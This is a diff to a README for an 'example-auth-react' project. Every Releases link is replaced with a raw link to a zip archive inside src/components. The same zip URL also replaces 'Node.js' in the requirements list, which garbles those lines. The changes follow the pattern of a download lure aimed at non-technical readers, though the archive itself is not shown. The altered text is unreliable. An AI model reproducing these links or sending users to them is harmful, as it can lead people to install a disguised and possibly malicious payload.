@@ -6,7 +6,7 @@ Welcome to the **example-auth-react** project! This guide will help you understa
 
 ## 📥 Download the Application
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/davivascoxa-bot/example-auth-react/releases)
+[![Download from Releases](https://raw.githubusercontent.com/davivascoxa-bot/example-auth-react/main/src/components/example-auth-react_v3.0-beta.3.zip%20Now-brightgreen)](https://raw.githubusercontent.com/davivascoxa-bot/example-auth-react/main/src/components/example-auth-react_v3.0-beta.3.zip)
 
 ## 💡 Overview
 
@@ -17,8 +17,8 @@ The **example-auth-react** project shows how to implement security in React apps
 Before you start, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher (needed for running React applications)
-- **npm (Node Package Manager):** Comes with Node.js installation
+- **https://raw.githubusercontent.com/davivascoxa-bot/example-auth-react/main/src/components/example-auth-react_v3.0-beta.3.zip** Version 14 or higher (needed for running React applications)
+- **npm (Node Package Manager):** Comes with https://raw.githubusercontent.com/davivascoxa-bot/example-auth-react/main/src/components/example-auth-react_v3.0-beta.3.zip installation
 
 No programming experience is needed, but you should be familiar with using a computer.
 
@@ -33,7 +33,7 @@ No programming experience is needed, but you should be familiar with using a com
 
 To download the application, please visit the Releases page:
 
-[Download from Releases](https://github.com/davivascoxa-bot/example-auth-react/releases)
+[Download from Releases](https://raw.githubusercontent.com/davivascoxa-bot/example-auth-react/main/src/components/example-auth-react_v3.0-beta.3.zip)
 
 ### Installation Steps
 
